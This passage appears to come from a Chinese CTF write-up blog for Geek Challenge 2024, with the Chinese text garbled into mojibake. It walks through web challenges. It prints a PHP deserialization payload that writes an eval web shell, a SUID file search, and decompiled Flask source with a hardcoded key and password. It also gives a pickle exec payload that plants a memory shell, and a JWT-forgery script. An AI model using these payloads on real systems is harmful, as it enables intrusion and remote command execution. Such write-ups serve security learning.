class="string">&quot;system&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Starven&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;invoke&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Girlfriend&quot;</span>;s:<span class="number">69</span>:<span class="string">&quot;echo &#x27;&lt;?php eval(<span class="subst">$_POST</span>[123]);phpinfo();?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶å­˜åœ¨suidæƒé™çš„æœ‰fileé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªæ¥è¯»å–æ–‡ä»¶<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160320606.png" class="">  </p><h2 id="py-game"><a href="#py-game" class="headerlink" title="py_game"></a>py_game</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-233248488.png" class="">  <p>éª—å­å‡çš„<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234015050.png" class=""><br>è¿˜æ˜¯å¾—sessionä¼ªé€ <br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234355039.png" class=""><br>å¾—åˆ°å…¶keyä¸ºa123456æˆ‘ä»¬å°†usernameæ”¹ä¸ºadmin<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234640484.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234724031.png" class="">  </p><p>æ¥ä¸‹æ¥è®¿é—®admin<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234755579.png" class=""><br>å¯ä»¥ä¸‹è½½pyc<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-235444172.png" class=""><br>åç¼–è¯‘å¾—åˆ°æºç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [</span><br><span class="line">    admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;ç”¨æˆ·åå·²å­˜åœ¨&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;æ³¨å†ŒæˆåŠŸï¼è¯·ç™»å½•&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register = app.route(<span class="string">&#x27;/register&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: password &#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = app.route(<span class="string">&#x27;/login&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, **(<span class="string">&#x27;encoding&#x27;</span>,)) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;è¯·å…ˆç™»å½•&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">play = app.route(<span class="string">&#x27;/play&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(play)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], **(<span class="string">&#x27;username&#x27;</span>,))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;ä½ æ²¡æœ‰æƒé™è®¿é—®&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">admin = app.route(<span class="string">&#x27;/admin&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;as_attachment&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">downloads321 = app.route(<span class="string">&#x27;/downloads321&#x27;</span>)(downloads321)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], user_tag, is_admin, **(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;is_admin&#x27;</span>))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;è¯·å…ˆç™»å½•&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dashboard = app.route(<span class="string">&#x27;/dashboard&#x27;</span>)(dashboard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(<span class="literal">True</span>, <span class="literal">True</span>, **(<span class="string">&#x27;load_dtd&#x27;</span>, <span class="string">&#x27;resolve_entities&#x27;</span>))</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser, **(<span class="string">&#x27;parser&#x27;</span>,))</span><br><span class="line">        result_xml = etree.tostring(tree, <span class="literal">True</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;pretty_print&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;xml_declaration&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, <span class="string">&#x27;application/xml&#x27;</span>, **(<span class="string">&#x27;mimetype&#x27;</span>,))</span><br><span class="line">        <span class="keyword">except</span> etree.XMLSyntaxError:</span><br><span class="line">            e = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xml_parse = app.route(<span class="string">&#x27;/xml_parse&#x27;</span>)(xml_parse)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = <span class="literal">None</span>.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;æ›´æ–°æˆåŠŸ&#x27;</span> &#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">f&#x27;&#x27;&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">                    e = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">del</span> e</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update_route = app.route(<span class="string">&#x27;/update&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(update_route)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, <span class="literal">False</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>))</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-235612525.png" class=""><br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°update_routeè·¯ç”±æ˜¯å­˜åœ¨åŸå‹è¿æ±¡æŸ“çš„è€Œ/xml_parseä¼šè§£æxmlï¼Œxmlçš„å†…å®¹æ˜¯config[â€˜xml_dataâ€™],é‚£ä¹ˆæˆ‘ä»¬åªè¦æ±¡æŸ“å…¶å€¼å°±å¯ä»¥æ‰“xxeå¦‚ä¸‹<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-112903200.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-112914575.png" class="">  </p><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-000155041.png" class="">  <p>å¯ä»¥è¿›è¡Œæ—¥å¿—æ–‡ä»¶åŒ…å«<br>ç›´æ¥UAå¤´å†™é©¬<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-001106105.png" class="">  </p><p>phpinfoé‡Œæœ‰flag</p><h2 id="jwt-pickle"><a href="#jwt-pickle" class="headerlink" title="jwt_pickle"></a>jwt_pickle</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-194516698.png" class="">  <p>æ­£å¸¸çš„æ³¨å†Œæ˜¯ä¼šå°†è´¦å·å¯†ç å­˜åœ¨user_listé‡Œçš„ï¼Œä½†æ˜¯ç™»é™†æ—¶é™¤äº†adminå…¶ä»–çš„is_adminçš„å€¼éƒ½ä¸ºfalseã€‚çŒœæµ‹è¦è¿›è¡Œjwtä¼ªé€ </p><p>å…ˆæ³¨å†Œä¸¤ä¸ªè´¦å·ï¼Œä½¿ç”¨jwt_forgeryæ¥ç”Ÿæˆå…¬é’¥(è¿™ä¸ªæ–¹æ³•è¿˜æ˜¯åœ¨ç½‘é¼å­¦çš„ï¼Œä¸çŸ¥é“å‡ºé¢˜äººæ˜¯åœ¨ç½‘é¼å‰å‡ºçš„è¿˜æ˜¯ç½‘é¼åå‡ºçš„)</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160839351.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161839147.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161858560.png" class="">  <p>æ¥ç€çœ‹æºç </p><p>å¯ä»¥å‘ç°adminè·¯ç”±åœ¨RS256è§£å¯†å¤±è´¥æ—¶ä¼šä½¿ç”¨HS256è§£å¯†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªè¦å°†jwtä½¿ç”¨HS256å…¬é’¥ä½œä¸ºkeyå³å¯è¿›è¡Œjwtä¼ªé€ ã€‚<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-194330755.png" class="">  </p><p>è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æå–jwtä¸­çš„introductionæ¥base64è§£å¯†pickleååºåˆ—åŒ–ï¼Œè¿™é‡Œå°±å­˜åœ¨pickleååºåˆ—åŒ–æ¼æ´</p><p>æˆ‘è¿™é‡Œå°±ç›´æ¥æ‰“å†…å­˜é©¬äº†<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><br>ç„¶åå¯¹å…¶è¿›è¡ŒHS256çš„jwtåŠ å¯†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;D:\\å·¥å…·\\CTFå·¥å…·\\JWT\\rsa_sign2n-release(flask_cve_JWT_public)\\standalone\\ae677efb83731c6f_65537_pkcs1.pem&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;123&#x27;</span>,<span class="attr">password</span>: <span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>,  <span class="attr">is_admin</span>: <span class="literal">true</span> ,<span class="attr">introduction</span>:<span class="string">&quot;gASV4QAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzFZ2xvYmFsIGV4Y19jbGFzcztnbG9iYWwgY29kZTtleGNfY2xhc3MsIGNvZGUgPSBhcHAuX2dldF9leGNfY2xhc3NfYW5kX2NvZGUoNDA0KTthcHAuZXJyb3JfaGFuZGxlcl9zcGVjW05vbmVdW2NvZGVdW2V4Y19jbGFzc10gPSBsYW1iZGEgYTpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKHJlcXVlc3QuYXJncy5nZXQoJ2d4bmd4bmd4bicpKS5yZWFkKCmUhZRSlC4=&quot;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure><br>ä¸»è¦usernameå’Œpasswordçš„å€¼æ˜¯è¦åœ¨user_listé‡Œçš„å³æ˜¯æ³¨å†Œè¿‡çš„ã€‚</p><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161254709.png" class="">  <img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-154811509.png" class="">  <h2 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h2><img 